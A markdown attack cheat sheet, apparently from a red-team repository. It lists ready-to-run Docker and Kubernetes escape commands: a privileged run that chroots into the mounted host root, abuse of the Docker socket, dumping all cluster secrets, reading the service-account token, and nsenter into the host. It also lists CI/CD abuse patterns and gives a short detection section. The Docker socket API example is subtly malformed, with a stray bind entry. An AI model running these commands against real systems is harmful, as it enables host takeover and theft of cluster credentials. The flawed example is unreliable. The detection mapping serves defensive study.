# GTFOBins - Container and Orchestration Escape

| Field | Value |
|---|---|
| `evasion_ids` | EV-CTR-0001..EV-CTR-0005, EV-CI-0001..EV-CI-0003 |
| `attack_ids` | T1610, T1609, T1195.002, T1068 |
| `detections` | `06-defense/sigma/ssa_docker_privileged_run.yml`, `06-defense/hardening/kubernetes-baseline.md` |

## 1. Docker escape

```bash
# 1. Privileged container with host filesystem mounted
docker run -v /:/host -it --privileged --net=host --pid=host alpine chroot /host

# 2. Docker socket exposure -> host root
docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["chroot","/host"],"HostConfig":{"Binds":["/:/host","- /:/host"]}}'

# 3. Abusive capabilities without --privileged
docker run --cap-add SYS_ADMIN --security-opt apparmor=unconfined alpine
```

## 2. Kubernetes

| Attack | Command | Technique |
|---|---|---|
| Exec into a pod | `kubectl exec -it POD -c CONTAINER -- sh` | T1609 |
| Create a privileged pod | `kubectl run x --image=alpine --overrides='{"spec":{"hostPID":true}}' -- sh` | T1610 |
| Read secrets | `kubectl get secrets -A -o json` | T1552.001 |
| Use a service account token | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` | T1552.007 |
| Escape via nsenter | `nsenter -t 1 -m -u -i -n -p bash` | T1610 |
| RBAC enumerate | `kubectl auth can-i --list` | T1069 |

## 3. CI/CD abuse

| Platform | Abuse | Technique |
|---|---|---|
| Jenkins | Script Console, arbitrary Groovy, credential binding leakage | T1195.002 |
| GitLab Runner | Shell executor with untrusted repo `.gitlab-ci.yml` | T1195.002 |
| GitHub Actions | `pull_request_target` + checkout of fork code | T1195.002 |
| Argo CD | `spec.source.path` write via API | T1195.002 |
| Docker Hub | malicious base image / entrypoint | T1195.002 |

## 4. Detection

* Kubernetes audit log: `exec` on pods, `create pods` with `hostPID`,
  `get secrets` cluster-wide, RBAC escalation verbs.
* Container runtime: runc events; container start with `privileged=true`,
  host namespace sharing, or a bind mount of `/`, `/var/run/docker.sock`,
  `/proc`, `/sys`.
* Sigma: `ssa_docker_privileged_run.yml`, `ssa_kubectl_exec_pod.yml`.
* Network: pod -> metadata service, pod -> internet on 443 from a build job.
